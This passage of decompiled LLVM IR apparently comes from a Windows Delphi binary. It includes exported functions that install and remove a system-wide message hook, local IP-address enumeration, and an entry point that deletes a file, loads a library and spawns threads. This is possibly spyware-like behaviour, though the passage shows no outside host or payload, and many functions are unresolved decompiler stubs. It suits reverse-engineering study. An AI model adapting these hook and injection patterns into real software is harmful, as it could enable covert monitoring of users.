  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1990
}

define i32 @function_4076c4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4076c4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1991
}

define i32 @function_4076df() local_unnamed_addr {
dec_label_pc_4076df:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1992
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1992
  store i32 %3, i32* %4, align 4, !insn.addr !1992
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1993
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1993
  %9 = add i8 %6, %8, !insn.addr !1993
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1993
  store i8 %9, i8* %10, align 1, !insn.addr !1993
  %11 = add i32 %2, 81, !insn.addr !1994
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1994
  %13 = load i8, i8* %12, align 1, !insn.addr !1994
  %14 = trunc i32 %1 to i8, !insn.addr !1994
  %15 = add i8 %13, %14, !insn.addr !1994
  store i8 %15, i8* %12, align 1, !insn.addr !1994
  %16 = load i32, i32* %eax, align 4, !insn.addr !1995
  ret i32 %16, !insn.addr !1995
}

define x86_fp80 @function_4076e7() local_unnamed_addr {
dec_label_pc_4076e7:
  %0 = call x86_fp80 @__decompiler_undefined_function_12()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1996
  ret x86_fp80 %1, !insn.addr !1997
}

define i32 @function_4076ec() local_unnamed_addr {
dec_label_pc_4076ec:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1998
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1999
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1999
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1999
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !2000
  %3 = call i32 @function_4074f0(), !insn.addr !2001
  %4 = call i32 @"@LStrCmp"(), !insn.addr !2002
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !2003
  %6 = icmp eq i32 %5, 180, !insn.addr !2004
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !2005
  br i1 %6, label %dec_label_pc_40774f, label %dec_label_pc_40772a, !insn.addr !2005

dec_label_pc_40772a:                              ; preds = %dec_label_pc_4076ec
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !2006
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !2007
  %10 = icmp eq i1 %9, false, !insn.addr !2008
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !2008
  br i1 %10, label %dec_label_pc_40774f, label %dec_label_pc_407736, !insn.addr !2008

dec_label_pc_407736:                              ; preds = %dec_label_pc_40772a
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !2009
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_40774f

dec_label_pc_40774f:                              ; preds = %dec_label_pc_407736, %dec_label_pc_4076ec, %dec_label_pc_40772a
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !2010
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !2011
  %13 = add i32 %esp.1, 8, !insn.addr !2012
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2012
  store i32 4224882, i32* %14, align 4, !insn.addr !2012
  %15 = call i32 @"@LStrClr"(), !insn.addr !2013
  ret i32 %15, !insn.addr !2014
}

define i32 @function_40776b() local_unnamed_addr {
dec_label_pc_40776b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2015
  ret i32 %0, !insn.addr !2015
}

define i32 @function_407770() local_unnamed_addr {
dec_label_pc_407770:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2016
}

define i32 @function_407772(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2017
}

define i32 @function_407788() local_unnamed_addr {
dec_label_pc_407788:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !2018
  %3 = call i32* @GetDC(i32* %2), !insn.addr !2018
  %4 = ptrtoint i32* %3 to i32, !insn.addr !2018
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !2019
  %6 = inttoptr i32 %5 to i32*, !insn.addr !2020
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !2020
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !2021
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !2022
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !2023
  %11 = inttoptr i32 %1 to i32*, !insn.addr !2024
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !2024
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !2025
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !2026
  %16 = ashr i32 %15, 31, !insn.addr !2027
  %17 = zext i32 %15 to i64, !insn.addr !2028
  %18 = zext i32 %16 to i64, !insn.addr !2028
  %19 = mul i64 %18, 4294967296, !insn.addr !2028
  %20 = or i64 %19, %17, !insn.addr !2028
  %21 = zext i32 %4 to i64, !insn.addr !2028
  %22 = sdiv i64 %20, %21, !insn.addr !2028
  %23 = trunc i64 %22 to i32, !insn.addr !2028
  ret i32 %23, !insn.addr !2029
}

define i32 @function_4077e4() local_unnamed_addr {
dec_label_pc_4077e4:
  %esp.0.reg2mem = alloca i32, !insn.addr !2030
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2031
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !2031
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !2031
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2032
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !2033
  %3 = icmp eq i32 %2, 0, !insn.addr !2033
  br i1 %3, label %dec_label_pc_407820, label %dec_label_pc_40780d, !insn.addr !2034

dec_label_pc_40780d:                              ; preds = %dec_label_pc_4077e4
  %4 = inttoptr i32 %2 to i32*, !insn.addr !2035
  store i32 0, i32* %4, align 4, !insn.addr !2035
  br label %dec_label_pc_407820, !insn.addr !2036

dec_label_pc_407820:                              ; preds = %dec_label_pc_40780d, %dec_label_pc_4077e4
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !2037
  %6 = icmp eq i32 %5, 0, !insn.addr !2037
  br i1 %6, label %dec_label_pc_407834, label %dec_label_pc_40782a, !insn.addr !2038

dec_label_pc_40782a:                              ; preds = %dec_label_pc_407820
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !2039
  %8 = icmp eq i32 %7, 0, !insn.addr !2039
  %9 = icmp eq i1 %8, false, !insn.addr !2040
  br i1 %9, label %dec_label_pc_40783e, label %dec_label_pc_407834, !insn.addr !2040

dec_label_pc_407834:                              ; preds = %dec_label_pc_40782a, %dec_label_pc_407820
  %10 = call i32 @function_407918(), !insn.addr !2041
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !2042
  br label %dec_label_pc_4078db, !insn.addr !2042

dec_label_pc_40783e:                              ; preds = %dec_label_pc_40782a
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2043
  %12 = icmp eq i8 %11, 0, !insn.addr !2043
  br i1 %12, label %dec_label_pc_407867, label %dec_label_pc_407848, !insn.addr !2044

dec_label_pc_407848:                              ; preds = %dec_label_pc_40783e
  %13 = call i32 @function_407100(), !insn.addr !2045
  %14 = icmp eq i32 %13, 0, !insn.addr !2046
  br i1 %14, label %dec_label_pc_407867, label %dec_label_pc_407860, !insn.addr !2047

dec_label_pc_407860:                              ; preds = %dec_label_pc_407848
  %15 = call i32 @function_407918(), !insn.addr !2048
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !2049
  br label %dec_label_pc_4078db, !insn.addr !2049

dec_label_pc_407867:                              ; preds = %dec_label_pc_407848, %dec_label_pc_40783e
  %16 = call i32 @"@LStrCatN"(), !insn.addr !2050
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2051
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 2 to i32 (i32*)*), i32* inttoptr (i32 4220900 to i32*), i32 0, i32* null), !insn.addr !2052
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4220900 to i32*), i32 0, i32* null), !insn.addr !2053
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !2054
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !2054
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4220900 to i32*), i32 0, i32* null), !insn.addr !2055
  %23 = call i32 @function_407918(), !insn.addr !2056
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !2056
  br label %dec_label_pc_4078db, !insn.addr !2056

dec_label_pc_4078db:                              ; preds = %dec_label_pc_407867, %dec_label_pc_407860, %dec_label_pc_407834
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !2057
  %25 = load i32, i32* %24, align 4, !insn.addr !2057
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !2058
  %26 = add i32 %esp.0.reload, 8, !insn.addr !2059
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2059
  store i32 4225272, i32* %27, align 4, !insn.addr !2059
  %28 = call i32 @"@LStrClr"(), !insn.addr !2060
  ret i32 %28, !insn.addr !2061
}

define i32 @function_4078f1() local_unnamed_addr {
dec_label_pc_4078f1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2062
  ret i32 %0, !insn.addr !2062
}

define i32 @function_4078f6() local_unnamed_addr {
dec_label_pc_4078f6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2063
}

define i32 @function_4078f8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4078f8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2064
}

define i32 @function_407918() local_unnamed_addr {
dec_label_pc_407918:
  %0 = call i32 @"@LStrClr"(), !insn.addr !2065
  %1 = call i32 @"@LStrClr"(), !insn.addr !2066
  ret i32 %1, !insn.addr !2067
}

define i32 @function_407930() local_unnamed_addr {
dec_label_pc_407930:
  %eax.0.reg2mem = alloca i32, !insn.addr !2068
  %esp.0.reg2mem = alloca i32, !insn.addr !2068
  %esp.15.reg2mem = alloca i32, !insn.addr !2068
  %storemerge6.reg2mem = alloca i32, !insn.addr !2068
  %.reg2mem = alloca i32, !insn.addr !2068
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !2068
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !2069
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !2070
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !2071
  %5 = call i32 @"@LStrClr"(), !insn.addr !2072
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !2073
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !2073
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !2074
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !2075
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !2076
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !2076
  %11 = icmp eq %hostent* %9, null, !insn.addr !2077
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2078
  br i1 %11, label %dec_label_pc_40798e, label %dec_label_pc_407968, !insn.addr !2078

dec_label_pc_407968:                              ; preds = %dec_label_pc_407930
  %12 = add i32 %10, 12, !insn.addr !2079
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2079
  %14 = load i32, i32* %13, align 4, !insn.addr !2079
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2080
  %16 = load i32, i32* %15, align 4, !insn.addr !2080
  %17 = icmp eq i32 %16, 0, !insn.addr !2081
  %18 = icmp eq i1 %17, false, !insn.addr !2082
  br i1 %18, label %dec_label_pc_40796f.lr.ph, label %dec_label_pc_407989, !insn.addr !2082

dec_label_pc_40796f.lr.ph:                        ; preds = %dec_label_pc_407968
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !2075
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_40796f

dec_label_pc_40796f:                              ; preds = %dec_label_pc_40796f.lr.ph, %dec_label_pc_407981
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !2083
  %21 = icmp eq i1 %20, false, !insn.addr !2084
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !2084
  br i1 %21, label %dec_label_pc_407981, label %dec_label_pc_407973, !insn.addr !2084

dec_label_pc_407973:                              ; preds = %dec_label_pc_40796f
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !2085
  %23 = load i32, i32* %22, align 4, !insn.addr !2085
  %24 = add i32 %esp.15.reload, -4, !insn.addr !2085
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2085
  store i32 %23, i32* %25, align 4, !insn.addr !2085
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !2086
  %27 = call i32 @StrPas(), !insn.addr !2087
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !2087
  br label %dec_label_pc_407981, !insn.addr !2087

dec_label_pc_407981:                              ; preds = %dec_label_pc_407973, %dec_label_pc_40796f
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !2088
  %29 = mul i32 %28, 4, !insn.addr !2080
  %30 = add i32 %29, %14, !insn.addr !2080
  %31 = inttoptr i32 %30 to i32*, !insn.addr !2080
  %32 = load i32, i32* %31, align 4, !insn.addr !2080
  %33 = icmp eq i32 %32, 0, !insn.addr !2081
  %34 = icmp eq i1 %33, false, !insn.addr !2082
  store i32 %32, i32* %.reg2mem, !insn.addr !2082
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !2082
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !2082
  br i1 %34, label %dec_label_pc_40796f, label %dec_label_pc_407989, !insn.addr !2082

dec_label_pc_407989:                              ; preds = %dec_label_pc_407981, %dec_label_pc_407968
  %35 = call i32 @WSACleanup(), !insn.addr !2089
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !2089
  br label %dec_label_pc_40798e, !insn.addr !2089

dec_label_pc_40798e:                              ; preds = %dec_label_pc_407989, %dec_label_pc_407930
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2090
}

define i32 @function_40799c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40799c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = inttoptr i32 %0 to i32*, !insn.addr !2091
  %2 = call i32 @CallNextHookEx(i32* %1, i32 %arg1, i32 %arg2, i32 %arg3), !insn.addr !2091
  ret i32 %2, !insn.addr !2092
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_4079bc:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4225436 to i32*), i32 3), !insn.addr !2093
  %2 = ptrtoint i32* %1 to i32, !insn.addr !2093
  store i32 %2, i32* @global_var_4096e8, align 4, !insn.addr !2094
  %3 = icmp eq i32* %1, null, !insn.addr !2095
  %4 = icmp eq i1 %3, false, !insn.addr !2096
  %5 = sext i1 %4 to i32, !insn.addr !2097
  ret i32 %5, !insn.addr !2098
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_4079e8:
  %0 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !2099
  %1 = inttoptr i32 %0 to i32*, !insn.addr !2100
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !2100
  %3 = sext i1 %2 to i32, !insn.addr !2100
  ret i32 %3, !insn.addr !2101
}

define i32 @function_4079f4() local_unnamed_addr {
dec_label_pc_4079f4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2102
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2102
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2102
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2103
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !2104
  %3 = add i32 %2, 1, !insn.addr !2104
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !2104
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2105
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2106
  ret i32 0, !insn.addr !2107
}

define i32 @function_407a19() local_unnamed_addr {
dec_label_pc_407a19:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2108
  ret i32 %0, !insn.addr !2108
}

define i32 @function_407a1e() local_unnamed_addr {
dec_label_pc_407a1e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2109
}

define i32 @function_407a20(i32 %arg1) local_unnamed_addr {
dec_label_pc_407a20:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2110
}

define i32 @function_407a24() local_unnamed_addr {
dec_label_pc_407a24:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !2111
  %2 = add i32 %1, -1, !insn.addr !2111
  store i32 %2, i32* @global_var_4096e4, align 4, !insn.addr !2111
  ret i32 %0, !insn.addr !2112
}

define i32 @function_407a2c() local_unnamed_addr {
dec_label_pc_407a2c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2113
}

define i32 @SetFieldText.50() local_unnamed_addr {
dec_label_pc_407a57:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2114
  ret i32 %0, !insn.addr !2114
}

define i32 @function_407a5c() local_unnamed_addr {
dec_label_pc_407a5c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2115
}

define i32 @function_407a5e(i32 %arg1) local_unnamed_addr {
dec_label_pc_407a5e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2116
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407b40:
  %esp.2.reg2mem = alloca i32, !insn.addr !2117
  %esp.1.reg2mem = alloca i32, !insn.addr !2117
  %esp.0.reg2mem = alloca i32, !insn.addr !2117
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2118
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2119
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2119
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2119
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2120
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2121
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_4096ec to i8*), i32 0), !insn.addr !2122
  %5 = add i32 %4, ptrtoint (i8** @global_var_4096ec to i32), !insn.addr !2123
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2123
  store i8 0, i8* %6, align 1, !insn.addr !2123
  %7 = call i32 @"@LStrAsg"(), !insn.addr !2124
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !2125
  %9 = call i32 @function_407528(), !insn.addr !2126
  %10 = call i32 @"@LStrAsg"(), !insn.addr !2127
  %11 = call i32 @function_4075a0(), !insn.addr !2128
  %12 = trunc i32 %11 to i8, !insn.addr !2129
  %13 = icmp eq i8 %12, 0, !insn.addr !2129
  br i1 %13, label %dec_label_pc_407c57, label %dec_label_pc_407bdc, !insn.addr !2130

dec_label_pc_407bdc:                              ; preds = %dec_label_pc_407b40
  %14 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2131
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2132
  store i32 -1, i32* %15, align 4, !insn.addr !2132
  %16 = call i32 @"@LStrFromArray"(), !insn.addr !2133
  %17 = call i32 @function_407568(), !insn.addr !2134
  %18 = call i32 @"@LStrAsg"(), !insn.addr !2135
  %19 = call i32 @"@LStrCat3"(), !insn.addr !2136
  %20 = call i32 @function_4036c8(), !insn.addr !2137
  %21 = inttoptr i32 %20 to i8*, !insn.addr !2138
  %22 = call i1 @DeleteFileA(i8* %21), !insn.addr !2139
  %23 = call i32 @"@LStrCat3"(), !insn.addr !2140
  %24 = call i32 @function_4036c8(), !insn.addr !2141
  %25 = inttoptr i32 %24 to i8*, !insn.addr !2142
  store i8* %25, i8** %stack_var_-136, align 4, !insn.addr !2142
  %26 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2142
  %27 = call i32* @LoadLibraryA(i8* %25), !insn.addr !2143
  %28 = ptrtoint i32* %27 to i32, !insn.addr !2143
  store i32 %28, i32* @global_var_408118, align 4, !insn.addr !2144
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2145
  br label %dec_label_pc_407c84, !insn.addr !2145

dec_label_pc_407c57:                              ; preds = %dec_label_pc_407b40
  %29 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2121
  %30 = call i32 @function_40658c(), !insn.addr !2146
  %31 = call i32 @function_4075a0(), !insn.addr !2147
  %32 = trunc i32 %31 to i8, !insn.addr !2148
  %33 = icmp eq i8 %32, 0, !insn.addr !2148
  store i32 %29, i32* %esp.2.reg2mem, !insn.addr !2149
  br i1 %33, label %dec_label_pc_407dc6, label %dec_label_pc_407c79, !insn.addr !2149

dec_label_pc_407c79:                              ; preds = %dec_label_pc_407c57
  %34 = load i32, i32* @global_var_408138, align 4, !insn.addr !2150
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2151
  store i32 -1, i32* %35, align 4, !insn.addr !2151
  store i32 %29, i32* %esp.0.reg2mem, !insn.addr !2151
  br label %dec_label_pc_407c84, !insn.addr !2151

dec_label_pc_407c84:                              ; preds = %dec_label_pc_407c79, %dec_label_pc_407bdc
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %36 = add i32 %esp.0.reload, -4, !insn.addr !2152
  %37 = inttoptr i32 %36 to i32*, !insn.addr !2152
  store i32 260, i32* %37, align 4, !insn.addr !2152
  %38 = add i32 %esp.0.reload, -8, !insn.addr !2153
  %39 = inttoptr i32 %38 to i32*, !insn.addr !2153
  store i32 ptrtoint (i8** @global_var_4096ec to i32), i32* %39, align 4, !insn.addr !2153
  %40 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2154
  %41 = ptrtoint i32 (i32, i32, i32)* %40 to i32, !insn.addr !2154
  %42 = add i32 %esp.0.reload, -12, !insn.addr !2155
  %43 = inttoptr i32 %42 to i32*, !insn.addr !2155
  store i32 %41, i32* %43, align 4, !insn.addr !2155
  %44 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2156
  %45 = add i32 %44, ptrtoint (i8** @global_var_4096ec to i32), !insn.addr !2157
  %46 = inttoptr i32 %45 to i8*, !insn.addr !2157
  store i8 0, i8* %46, align 1, !insn.addr !2157
  %47 = call i32 @"@LStrFromArray"(), !insn.addr !2158
  %48 = call i32 @function_407568(), !insn.addr !2159
  %49 = call i32 @"@LStrAsg"(), !insn.addr !2160
  %50 = call i32 @"@LStrCat3"(), !insn.addr !2161
  %51 = load i32, i32* @global_var_408138, align 4, !insn.addr !2162
  %52 = icmp eq i32 %51, 0, !insn.addr !2162
  br i1 %52, label %dec_label_pc_407d1d, label %dec_label_pc_407cea, !insn.addr !2163

dec_label_pc_407cea:                              ; preds = %dec_label_pc_407c84
  %53 = add i32 %esp.0.reload, -16, !insn.addr !2164
  %54 = inttoptr i32 %53 to i32*, !insn.addr !2164
  store i32 ptrtoint ([16 x i8]* @global_var_407e48 to i32), i32* %54, align 4, !insn.addr !2164
  %55 = add i32 %esp.0.reload, -20, !insn.addr !2165
  %56 = inttoptr i32 %55 to i32*, !insn.addr !2165
  store i32 ptrtoint ([8 x i8]* @global_var_407e58 to i32), i32* %56, align 4, !insn.addr !2165
  %57 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2166
  %58 = icmp eq i32* %57, null, !insn.addr !2167
  %59 = icmp eq i1 %58, false, !insn.addr !2168
  store i32 %55, i32* %esp.2.reg2mem, !insn.addr !2168
  br i1 %59, label %dec_label_pc_407dc6, label %dec_label_pc_407d01, !insn.addr !2168

dec_label_pc_407d01:                              ; preds = %dec_label_pc_407cea
  %60 = add i32 %esp.0.reload, -24, !insn.addr !2169
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2169
  store i32 ptrtoint (i32* @global_var_409804 to i32), i32* %61, align 4, !insn.addr !2169
  %62 = add i32 %esp.0.reload, -28, !insn.addr !2170
  %63 = inttoptr i32 %62 to i32*, !insn.addr !2170
  store i32 0, i32* %63, align 4, !insn.addr !2170
  %64 = add i32 %esp.0.reload, -32, !insn.addr !2171
  %65 = inttoptr i32 %64 to i32*, !insn.addr !2171
  store i32 66, i32* %65, align 4, !insn.addr !2171
  %66 = add i32 %esp.0.reload, -36, !insn.addr !2172
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2172
  store i32 4221960, i32* %67, align 4, !insn.addr !2172
  %68 = add i32 %esp.0.reload, -40, !insn.addr !2173
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2173
  store i32 0, i32* %69, align 4, !insn.addr !2173
  %70 = add i32 %esp.0.reload, -44, !insn.addr !2174
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2174
  store i32 0, i32* %71, align 4, !insn.addr !2174
  %72 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2175
  store i32 %70, i32* %esp.2.reg2mem, !insn.addr !2176
  br label %dec_label_pc_407dc6, !insn.addr !2176

dec_label_pc_407d1d:                              ; preds = %dec_label_pc_407c84
  %73 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2177
  %74 = icmp eq i32 %73, 0, !insn.addr !2177
  store i32 %42, i32* %esp.2.reg2mem, !insn.addr !2178
  br i1 %74, label %dec_label_pc_407dc6, label %dec_label_pc_407d2b, !insn.addr !2178

dec_label_pc_407d2b:                              ; preds = %dec_label_pc_407d1d
  %75 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2179
  %76 = icmp eq i8 %75, 0, !insn.addr !2179
  br i1 %76, label %dec_label_pc_407d3a, label %dec_label_pc_407d35, !insn.addr !2180

dec_label_pc_407d35:                              ; preds = %dec_label_pc_407d2b
  %77 = call i32 @function_406dc8(), !insn.addr !2181
  br label %dec_label_pc_407d3a, !insn.addr !2181

dec_label_pc_407d3a:                              ; preds = %dec_label_pc_407d35, %dec_label_pc_407d2b
  %78 = load i32, i32* @global_var_408148, align 4, !insn.addr !2182
